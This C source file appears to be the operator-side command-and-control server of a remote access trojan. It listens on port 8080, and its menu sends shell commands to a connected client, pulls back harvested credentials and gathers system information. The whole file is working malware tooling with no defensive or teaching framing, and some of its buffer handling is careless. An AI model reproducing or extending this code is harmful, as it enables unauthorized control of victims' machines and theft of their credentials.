#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>

#define PORT 8080
#define MAXLINE 1024

char options[]="Choose an option:\n 1. Execute commands\n 2. Scan for credentials\n 3. Get system info\n";

void exec_on_client(int clientfd)
{   
    char input_message[MAXLINE];
    strcpy(input_message,"Enter command to execute on client: ");
    write(STDOUT_FILENO,input_message,sizeof(input_message));

    char command[MAXLINE];

    read(STDIN_FILENO,command,sizeof(command));

    write(clientfd,command,strlen(command));

    char command_result[MAXLINE*MAXLINE];

    int recv_len;
    recv_len=recv(clientfd,command_result,MAXLINE*MAXLINE,0);

    write(STDOUT_FILENO,command_result,recv_len);
    write(STDOUT_FILENO,"\n",1);
}

void get_credentials(int clientfd)
{
    char info_creds[MAXLINE];
    int recv_len;
    recv_len=recv(clientfd,info_creds,MAXLINE,0);

    write(STDOUT_FILENO,info_creds,recv_len);
}
int main()
{
    int sockfd;
    char buffer[MAXLINE];
    struct sockaddr_in servaddr;

    sockfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);

    if(sockfd<0)
    {
        perror("socket creation failed\n");
        exit(EXIT_FAILURE);
    }

    memset(&servaddr,0,sizeof(servaddr));

    servaddr.sin_family=AF_INET;
    servaddr.sin_port=htons(PORT);
    servaddr.sin_addr.s_addr=INADDR_ANY;

    if(bind(sockfd,(const struct sockaddr*)&servaddr,sizeof(servaddr))<0)
    {
        perror("socket bind failed\n");
        exit(EXIT_FAILURE);
    }

    if(listen(sockfd,20)<0)
    {
        perror("socket listen error\n");
        exit(EXIT_FAILURE);
    }
    else 
        printf("Server listening...\n");
    
    struct sockaddr_in client_addr;
    int connfd;
    int len=sizeof(client_addr);

    connfd=accept(sockfd,(struct sockaddr*) &client_addr,&len);

    if(connfd<0)
    {
        perror("server accept error\n");
        exit(EXIT_FAILURE);
    }
    else
        printf("Server accepted client connection\n");



    while(1)
    {   
        write(STDOUT_FILENO,options,strlen(options));

        char opt;
        read(STDIN_FILENO,&opt,sizeof(opt));
        switch(opt)
        {   
            //TODO: flush la buffer ul de stdin atunci cand vreau sa trimit o comanda
            case '1':
            write(connfd,"1",1);
            exec_on_client(connfd);
            break;
            case '2':
            write(connfd,"2",1);
            get_credentials(connfd);
            break;
            case '3':
            write(connfd, "3", 1);
            {
                char sys_info[MAXLINE * 10] = "";
                char buffer[MAXLINE]; 
                int total_bytes_read = 0;
                int bytes_read;

                while ((bytes_read = read(connfd, buffer, sizeof(buffer) - 1)) > 0) 
                {
                    buffer[bytes_read] = '\0'; 
                    char *end_marker = strstr(buffer, "<END_OF_DATA>");
                    if (end_marker != NULL) 
                    {
                        *end_marker = '\0';
                        strcat(sys_info, buffer);
                        printf("System Information from client:\n%s\n", sys_info);
                        break; 
                    }   
                    strcat(sys_info, buffer);
                    total_bytes_read += bytes_read;
                    if (total_bytes_read >= sizeof(sys_info) - 1) 
                    {
                        printf("Buffer limit reached, cannot read further data.\n");
                        break;
                    }
                 }

                if (total_bytes_read == 0) 
                {
                    printf("Failed to receive system information from client or connection closed.\n");
                }
            }
            break;
            
            default:
            break;

        }

    }

    close(connfd);
    
    return 0;
}